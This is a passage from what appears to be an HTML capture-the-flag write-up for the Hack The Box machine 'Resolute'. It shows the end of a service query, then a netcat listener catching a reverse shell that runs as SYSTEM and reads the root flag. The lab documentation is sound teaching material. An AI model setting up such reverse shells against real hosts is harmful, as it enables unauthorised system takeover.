+                                (NOT_STOPPABLE, NOT_PAUSABLE, IGNORES_SHUTDOWN)
+        WIN32_EXIT_CODE    : 0  (0x0)
+        SERVICE_EXIT_CODE  : 0  (0x0)
+        CHECKPOINT         : 0x0
+        WAIT_HINT          : 0x7d0
+        PID                : 1528
+        FLAGS              :
+
+</code></pre><h3 id="18ed1b9f-8847-8066-883a-fbc5f4d11ab8" class="">Rooted</h3><script src="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/prism.min.js" integrity="sha512-7Z9J3l1+EYfeaPKcGXu3MS/7T+w19WtKQY/n+xzmw4hZhJ9tyYmcUS+4QqAlzhicE5LAfMQSF3iFTK9bQdTxXg==" crossorigin="anonymous" referrerPolicy="no-referrer"></script><link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/themes/prism.min.css" integrity="sha512-tN7Ec6zAFaVSG3TpNAKtk4DOHNpSwKHxxrsiw4GHKESGPs5njn/0sMCUMl2svV4wo4BK/rCP7juYz+zx+l6oeQ==" crossorigin="anonymous" referrerPolicy="no-referrer"/><pre id="18ed1b9f-8847-80f4-bd47-f60b88498b24" class="code"><code class="language-Bash" style="white-space:pre-wrap;word-break:break-all">┌──(drroot㉿drroot)-[~/Desktop/.htb/Resolute]
+└─$ nc -lnvp 1205                                                   
+listening on [any] 1205 ...
+connect to [10.10.14.23] from (UNKNOWN) [10.10.10.169] 49832
+Microsoft Windows [Version 10.0.14393]
+(c) 2016 Microsoft Corporation. All rights reserved.
+
+C:\Windows\system32&gt;whoami
+whoami
+nt authority\system
+
+C:\Windows\system32&gt;type C:\Users\Administrator\Desktop\root.txt
+type C:\Users\Administrator\Desktop\root.txt
+5d379ae0573b1304397cfcc10e784c2e
+</code></pre></div></article><span class="sans" style="font-size:14px;padding-top:2em"></span></body></html>
